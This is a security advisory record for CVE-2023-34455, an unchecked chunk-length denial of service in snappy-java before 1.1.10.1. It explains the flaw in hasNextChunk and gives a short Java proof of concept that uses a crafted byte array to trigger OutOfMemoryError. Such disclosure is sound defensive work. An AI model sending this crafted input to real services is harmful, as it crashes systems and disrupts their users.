{"hash":"94266590c35ed6afcedc38fa85bcd3b0bc025a66","data":{"post":{"title":"snappy-java unchecked chunk length DoS","path":"/vulnerabilities/snappy-java-unchecked-chunk-length-dos-xray-522074/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>snappy-java unchecked chunk length DoS</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>org.xerial.snappy:snappy-java</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,1.1.10.1)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>snappy-java is a fast compressor/decompressor for Java. Due to use of an unchecked chunk length, an unrecoverable fatal error can occur in versions prior to 1.1.10.1.</p>\n<p>The code in the function hasNextChunk in the fileSnappyInputStream.java checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn't possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.</p>\n<p>In the case that the <code>compressed</code> variable is null, a byte array is allocated with the size given by the input data. Since the code doesn't test the legality of the <code>chunkSize</code> variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a <code>java.lang.NegativeArraySizeException</code> exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal <code>java.lang.OutOfMemoryError</code> error.</p>\n<p>Version 1.1.10.1 contains a patch for this issue.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-java\">package org.example;\nimport org.xerial.snappy.SnappyInputStream;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};\n        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));\n        byte[] out = new byte[50];\n        try {\n            in.read(out);\n        }\n        catch (Exception ignored) {\n\n        }\n    }\n}\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388</a></p>\n<p><a href=\"https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java</a></p>\n<p><a href=\"https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea</a></p>\n<p><a href=\"https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh</a></p>\n","description":"CVE-2023-34455, HIGH, snappy-java unchecked chunk length DoS","date_published":"2023-06-19","xray_id":"XRAY-522074","vul_id":"CVE-2023-34455","severity":"high","discovered_by":"Ori Hollander","last_updated":"2023-06-19","cvss":7.5}},"context":{}}